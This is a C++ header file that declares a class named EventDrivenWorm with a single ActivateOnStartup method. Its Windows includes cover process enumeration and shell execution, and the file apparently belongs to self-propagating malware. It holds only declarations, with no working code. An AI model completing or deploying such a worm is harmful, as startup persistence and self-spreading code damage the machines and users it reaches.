#ifndef EVENT_DRIVEN_WORM_H
#define EVENT_DRIVEN_WORM_H

#include <iostream>
#include <vector>
#include <filesystem>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <chrono>
#include <TlHelp32.h>
#include <Shellapi.h>

namespace fs = std::filesystem;

class EventDrivenWorm {
public:
    static void ActivateOnStartup();
};

#endif // EVENT_DRIVEN_WORM_H
